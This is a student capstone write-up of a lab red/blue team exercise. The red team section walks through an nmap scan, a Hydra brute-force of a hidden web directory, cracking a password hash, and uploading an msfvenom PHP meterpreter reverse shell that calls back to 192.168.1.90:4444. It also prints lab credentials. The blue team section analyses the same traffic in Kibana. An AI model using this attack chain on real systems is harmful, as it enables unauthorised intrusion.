## Note: The report of this project is attached above in pdf format
# Summary
# Red Vs. Blue Team Project
Capstone Engagement
Assessment, Analysis, and Hardening of a Vulnerable System
## Red Team
### The Attack
### Step 1: Discover the IP address of the Linux server
Run `nmap 192.168.1.0/24`
* From the Nmap scan we can see that port 80 and port 22 is open
* image25
* In the web browser, searched IP 192.168.1.105
* image
### Step 2: Locate the hidden directory on the server.
- Navigated to the secret folder directory by typing: 192.168.1.105/company_folders/secret_folder into the search bar
- The directory asks for authentication in order to access it.The user with access to this folder is Ashton 
### Step 3: Brute force the password for the hidden directory.
- The folder is password protected and we used Hydra to brute force into the directory. We ran Hydra against Ashton's user name and wordlist
- Command: `hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder`
- image29
- The username is ashton and the password is leopoldo
- We accessed the Secret folder and we got the information below
- image33
- image34
- Inside of the WebDAV file are instructions on how to connect to the WebDAV directory, as well the user's username and hashed password.
- image3
### Step 4: Connect to the server via Webdav
- We simply used and online tool called Crack Station to break the password hash. https://crackstation.net
- image6
- The password is revealed as: linux4u
### Step 5: Connect to the server via WebDAV
- Following the direction in the secret folder
- Open the File System
- Click Browse Network
- Type: dav://192.168.1.105/webdav into the url bar
- Enter Ryan's credentials to log in
- image
### Step 6: Upload a PHP reverse shell payload
- Command to create the reverse shell:
- Commad: `msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 >> shell.php`
- image2
- To set up listener
- Run `msfconsole`
- Run `use exploit/multi/handler`
- Run `set payload php/meterpreter/reverse_tcp`
- Run `show options and point out they need to set the LHOST`
- Run `set LHOST 192.168.1.90`
- Run `exploit`
- Copy the reverse shell onto the WebdDAV directory
- image5
- connect to the webdav folder by navigating to 192.168.1.105/webdav and use ryan's username and password `username:ryan password:linux4u`
- click on the shell.php file to activate it.
- image4
### Step 7: Find and capture the flag
- Run `shell` to drop into bash shell
- Command to find the flag: `find . -iname flag.txt`
- image1
## Blue Team
## Incident Analysis with Kibana
### Final dashboard
- image10
- image11
### 1. Identify the Offensive Traffic
- Run `source.ip: 192.168.1.90 and destination.ip: 192.168.1.105` in which the source IP is my Kali machine and the destination machine is the victim web server
- Run `url.path: /company_folders/secret_folder/`
- The attack occurred in the last 7 days
- image13-1
- We can see 401, 301, 207 and 200 as the top responses
- We can also see with the HTTP Error Codes [Packetbeat] ECS panel:
- image14
- We can see a connection spike in the Connections over time [Packetbeat Flows] ECS
- image15
- We can also see a spike in errors in the Errors vs successful transactions [Packetbet] ECS
- image16
### 2. Find the Request for the Hidden Directory
- Looking at the Top 10 HTTP requests [Packetbeat] ECS panel:
- image17
- we can see that the hidden directory (secret folder) folder was requested 16,075 times
- image19
- We can see in the same panel that the file connect_to_corp_server was requested 2 times
- Alert: We could set an alert that goes off for any machine that attempts to access this directory or file.
- Mitigation: This directory and file should be removed from the server all together
### 3. Identify the Brute Force Attack
- identifying packets specifically from Hydra
- Using the search function search url.path: /company_folders/secret_folder/. This will show a few conversations involving this folder.
- image18
- Looking through the results and we notice that Hydra is identified under the user_agent.original section
- In the Top 10 HTTP requests [Packetbeat] ECS panel, we can see that the password protected secret_folder was requested 16,075 times, but the file inside that directory was only requested 2 times. So, out of 16,075 requests, only 2 were successful
